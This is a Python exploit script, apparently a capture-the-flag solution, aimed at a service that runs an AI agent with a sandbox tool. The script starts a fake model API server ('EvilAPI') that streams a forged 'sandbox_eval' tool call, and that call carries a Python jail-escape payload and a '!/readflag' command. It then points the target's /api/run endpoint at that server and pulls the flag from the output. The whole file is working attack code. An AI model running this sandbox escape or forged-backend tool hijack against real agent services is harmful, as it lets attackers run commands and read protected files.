#!/usr/bin/env python3
import argparse
import json
import re
import threading
import time
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


PYJAIL_PAYLOAD = "[[]for[quit.__class__.__iter__]in[[help]]for[]in[quit]]"
SANDBOX_STDIN = "\n".join([PYJAIL_PAYLOAD, "sys", "", "!/readflag", "", "q", "q"]) + "\n"


def sse_event(name: str, data: dict) -> str:
    if "type" not in data:
        data = {"type": name, **data}
    raw = json.dumps(data, separators=(",", ":"))
    return f"event: {name}\ndata: {raw}\n\n"


def response_base(output: list[dict], status: str = "completed") -> dict:
    return {
        "id": "resp_sctf",
        "object": "response",
        "created_at": int(time.time()),
        "status": status,
        "model": "gpt-5",
        "output": output,
        "parallel_tool_calls": True,
        "tool_choice": "auto",
        "tools": [],
    }


def tool_call_stream() -> bytes:
    arguments = json.dumps({"stdin": SANDBOX_STDIN})
    item = {
        "id": "fc_sandbox",
        "type": "function_call",
        "status": "completed",
        "call_id": "call_sandbox",
        "namespace": "mcp__sandbox",
        "name": "sandbox_eval",
        "arguments": arguments,
    }
    start_item = {**item, "status": "in_progress", "arguments": ""}
    stream = [
        sse_event("response.output_item.added", {"output_index": 0, "item": start_item}),
        sse_event(
            "response.function_call_arguments.delta",
            {"item_id": item["id"], "output_index": 0, "delta": arguments},
        ),
        sse_event(
            "response.function_call_arguments.done",
            {"item_id": item["id"], "output_index": 0, "arguments": arguments},
        ),
        sse_event("response.output_item.done", {"output_index": 0, "item": item}),
        sse_event("response.completed", {"response": response_base([item])}),
    ]
    return "".join(stream).encode()


def final_message_stream(text: str = "done") -> bytes:
    item = {
        "id": "msg_done",
        "type": "message",
        "status": "completed",
        "role": "assistant",
        "content": [{"type": "output_text", "text": text, "annotations": []}],
    }
    stream = [
        sse_event("response.output_item.done", {"output_index": 0, "item": item}),
        sse_event("response.completed", {"response": response_base([item])}),
    ]
    return "".join(stream).encode()


class EvilAPI(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        return

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        raw = self.rfile.read(length)
        try:
            payload = json.loads(raw)
        except json.JSONDecodeError:
            payload = {}

        inputs = payload.get("input") if isinstance(payload, dict) else []
        saw_tool_output = any(
            isinstance(item, dict) and item.get("type") == "function_call_output"
            for item in inputs or []
        )
        body = final_message_stream() if saw_tool_output else tool_call_stream()

        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def exploit(target: str, callback_url: str, api_key: str) -> str:
    endpoint = urllib.parse.urljoin(target.rstrip("/") + "/", "api/run")
    data = urllib.parse.urlencode({"url": callback_url, "api_key": api_key}).encode()
    req = urllib.request.Request(endpoint, data=data, method="POST")
    with urllib.request.urlopen(req, timeout=60) as resp:
        result = json.loads(resp.read().decode())
    return result.get("output", "")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="challenge base URL, for example http://127.0.0.1")
    parser.add_argument("--listen-host", default="0.0.0.0")
    parser.add_argument("--listen-port", default=9001, type=int)
    parser.add_argument(
        "--callback",
        default="http://host.docker.internal:9001/v1",
        help="URL that the challenge server can reach",
    )
    parser.add_argument("--api-key", default="sk-sctf-dummy")
    args = parser.parse_args()

    server = ThreadingHTTPServer((args.listen_host, args.listen_port), EvilAPI)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    time.sleep(0.2)

    try:
        output = exploit(args.target, args.callback, args.api_key)
        match = re.search(r"flag\{[^\s}]+\}", output)
        print(match.group(0) if match else output)
    finally:
        server.shutdown()


if __name__ == "__main__":
    main()
